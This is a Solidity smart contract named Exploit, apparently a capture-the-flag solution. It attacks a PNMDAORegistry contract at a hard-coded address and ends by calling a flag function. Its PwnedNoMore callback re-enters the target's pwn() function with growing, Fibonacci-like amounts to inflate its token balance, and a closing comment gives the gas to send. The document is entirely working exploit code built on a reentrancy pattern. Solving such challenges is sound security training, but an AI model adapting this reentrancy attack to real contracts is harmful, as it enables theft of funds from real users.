pragma solidity ^0.8.4;


import "./PNMDAORegistry.sol";
import "hardhat/console.sol";

contract Exploit {

    uint256 public last_amt;
    uint256 init_balance;
    uint256 last_balance;
    // uint256 public AMT_LIMIT = 6765;
    uint256 public AMT_LIMIT = 59425114757512643212875125;


    event AMT(uint256 amt);

    PNMDAORegistry registry;

    // The target contract
    address target = 0xa145293e9F7cb2c549AB96d71333D1bea85aA44A;

    function launch() public returns (uint256, uint256) {
        
        // registry = new PNMDAORegistry();
        registry = PNMDAORegistry(target);

        registry.register();

        init_balance = registry.balanceOf(address(this));

        last_amt = 1;

        registry.pwn(2);

        last_balance = registry.balanceOf(address(this));
        return (init_balance, last_balance);


    }

    function getBal() public view returns (uint256, uint256) {
        return (init_balance, last_balance);
    }

    function setLimit(uint256 amt) public {
        AMT_LIMIT = amt;
    }


    function PwnedNoMore(uint256 _amount) public returns (bool) {
        uint256 new_amt = last_amt + _amount;
        last_amt = _amount;

        // if (new_amt < 59425114757512643212875125) {
        // if (new_amt < 59425114757512643212875120) {
        // if (new_amt < 12586269025) {
        if (new_amt <= AMT_LIMIT) {
            // emit AMT(new_amt);
            // console.log("sending pwn(%s)", new_amt);
            registry.pwn(new_amt);
        }
        return true;
    }

    function getFlag() public {
        registry.identifyPNMDAOHacker();
    }

}

// Gas to send: 1,663,874 * 10 